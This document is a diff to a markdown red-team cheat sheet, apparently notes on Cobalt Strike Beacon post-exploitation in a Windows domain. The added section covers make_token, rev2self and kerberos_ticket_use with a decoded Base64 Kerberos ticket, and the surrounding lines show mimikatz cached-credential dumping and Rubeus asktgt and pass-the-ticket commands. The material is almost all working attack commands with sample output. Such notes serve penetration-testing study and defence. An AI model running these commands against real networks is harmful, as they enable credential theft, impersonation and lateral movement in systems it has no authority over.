@@ -78,7 +78,7 @@ Domain Cached Credentials were designed for instances where domain credentials a
 beacon> mimikatz lsadump::cache
 ```
 
-# Make Token
+# Make Token  
 
 The `make_token` module which takes the username, domain and plaintext password for a user, as well as a logon type.
 
@@ -89,6 +89,39 @@ This logon type allows the caller to clone its current token and specify new cre
 ```
 beacon> make_token CORP\user Passw0rd!
 ```
+
+With `rev2self` will drop the impersonation.
+
+```
+beacon> rev2self
+[*] Tasked beacon to revert token
+[+] host called home, sent: 20 bytes
+```
+
+## kerberos_ticket_use
+
+We can use the `make_token` module with a fake password if we inject kerberos tickets on memory.
+
+```
+beacon> make_token CORP\user FakePass
+```
+We can use `kerberos_ticket_use` to select a TGT of the user to impersonate.
+
+If we obtain a ticket from Rubeus and we have it in Base64 we will need to decode it and store on a file
+
+```
+PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\user.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
+```
+
+After that we can use the ticket.
+
+```
+beacon> kerberos_ticket_use C:\Tickets\user.kirbi
+```
+
+> **Note**: `kerberos_ticket_use` allows us to inject on memory `TGT` and `TGS`.
+
+> **Note**: After importing the ticket make sure to always use the FQDN. If not some `1326 errors` will appear.
 
 # Process Injection
 
@@ -209,7 +242,6 @@ To pass the TGT into this logon session, we can use Beacon's `kerberos_ticket_us
 ```powershell
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\UserTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 ```
-
 ```
 beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi 
 ```
@@ -217,7 +249,6 @@ beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 ## Elevated context
 
 If is on an elevated context, we can do it with Rubeus.
-
 
 ```
 beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.local /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 /nowrap /opsec  /createnetonly:C:\Windows\System32\cmd.exe
@@ -276,6 +307,8 @@ execute-assembly C:\Tools\Rubeus\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64
 [*] Target LUID: 0x92a8c
 [+] Ticket successfully imported!
 ```
+
+We can also use `make_token` and `kerberos_ticket_use` to import a TGT to the session.
 
 Steal the access token of that process and access to the target resource.
 
